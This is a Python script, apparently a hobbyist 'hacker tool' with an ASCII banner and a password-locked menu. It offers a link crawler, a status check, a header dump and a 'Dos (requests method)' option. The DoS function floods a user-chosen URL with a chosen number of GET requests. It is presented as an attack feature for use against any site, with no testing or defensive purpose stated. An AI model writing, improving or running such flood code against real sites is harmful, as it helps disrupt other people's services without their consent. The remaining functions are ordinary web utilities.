import requests
from bs4 import BeautifulSoup
import colorama
from colorama import *
import os

colorama.init()

banner = """
██     ██  █████  ██████  ████████ ███████ ██   ██ ███    ██ ██    ██     ██     ██ ███████ ██████  
██     ██ ██   ██ ██   ██    ██    ██       ██ ██  ████   ██  ██  ██      ██     ██ ██      ██   ██ 
██  █  ██ ███████ ██████     ██    █████     ███   ██ ██  ██   ████       ██  █  ██ █████   ██████  
██ ███ ██ ██   ██ ██   ██    ██    ██       ██ ██  ██  ██ ██    ██        ██ ███ ██ ██      ██   ██ 
 ███ ███  ██   ██ ██   ██    ██    ███████ ██   ██ ██   ████    ██         ███ ███  ███████ ██████  
                                                                                                                                                                                                     
"""

menu = """
╭────────────────────────────────╮
│ 1. Web-crawler                 │
│ 2. Site-status                 │
│ 3. Dos (requests method)       │
│ 4. Site-information            │
│ 5. Exit                        │
╰────────────────────────────────╯
"""

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def web_crawler():
    clear()
    print(Fore.CYAN + banner)
    url = input(Fore.CYAN + "Enter link >>> " + Fore.RESET).strip()
    if not url.startswith("http"):
        url = "http://" + url
    try:
        res = requests.get(url, timeout=10)
        res.raise_for_status()
        soup = BeautifulSoup(res.text, "html.parser")
        print(Fore.GREEN + f"\n[LINKS]:\n")
        links = set()
        for link in soup.find_all('a', href=True):
            href = link['href']
            links.add(href)
        for i, link in enumerate(sorted(links), 1):
            print(f"{i}. {link}")
    except Exception as e:
        print(Fore.RED + f"[ERROR]: {e}")
    input(Fore.YELLOW + "\nEnter any key to continue...")

def site_status():
    clear()
    print(Fore.CYAN + banner)
    url = input(Fore.CYAN + "Enter link >>> " + Fore.RESET).strip()
    if not url.startswith("http"):
        url = "http://" + url
    try:
        res = requests.head(url, timeout=10, allow_redirects=True)
        print(Fore.GREEN + f"\n[STATUS]: {res.status_code}")
    except Exception as e:
        print(Fore.RED + f"[ERROR]: {e}")
    input(Fore.YELLOW + "\nEnter eny key to continue...")

def dos_attack():
    clear()
    print(Fore.CYAN + banner)
    print(Fore.CYAN + "Be careful when using this feature.")
    url = input(Fore.CYAN + "Enter link >>> " + Fore.RESET).strip()
    if not url.startswith("http"):
        url = "http://" + url
    try:
        count = int(input(Fore.CYAN + "Enter number of requests >>> " + Fore.RESET))
    except:
        print(Fore.RED + "[ERROR]: Invalid number")
        input(Fore.CYAN + "\nEnter any key to continue...")
        return
    print(Fore.GREEN + f"\n[START]: {url} | {count} requests\n")
    success = 0
    for i in range(count):
        try:
            res = requests.get(url, timeout=5)
            if res.status_code == 200:
                success += 1
            print(f"Request {i+1}/{count} - Status: {res.status_code}")
        except:
            print(Fore.RED +f"Request {i+1}/{count} - Failed")
    print(Fore.GREEN + f"\nSuccessful requests: {success}/{count}")
    input(Fore.YELLOW + "\nEnter any key to continue...")

def site_information():
    clear()
    print(Fore.CYAN + banner)
    url = input(Fore.CYAN + "Enter link >>> " + Fore.RESET).strip()
    if not url.startswith("http"):
        url = "http://" + url
    try:
        res = requests.get(url, timeout=10)
        print(Fore.GREEN + f"\n[HEADERS]: {url}:\n")
        for header, value in res.headers.items():
            print(f"{header}: {value}")
    except Exception as e:
        print(Fore.RED + f"[ERROR]: {e}")
    input(Fore.YELLOW + "\nEnter any key to continue...")

def main():
    clear()
    print(Fore.CYAN + banner)
    print("@wartexny_software | version 1.0")
    password = input(Fore.CYAN + "Enter password >>> ")

    if password != "wartexny":
        print(Fore.RED + "\nPassword invalid")
        input(Fore.RED + "Enter any key to continue...")
        return 

    while True:
        clear()
        print(Fore.CYAN + banner)
        print(Fore.CYAN + menu)
        choice = input(Fore.CYAN + "Select a function >>> " + Fore.RESET).strip()

        if choice == '1':
            web_crawler()
        elif choice == '2':
            site_status()
        elif choice == '3':
            dos_attack()
        elif choice == '4':
            site_information()
        elif choice == '5':
            print(Fore.CYAN + "made by wartexny")
            break
        else:
            print(Fore.RED + "Invalid choice...")
            input(Fore.YELLOW + "\nEnter any key to continue...")

if __name__ == '__main__':
    main()

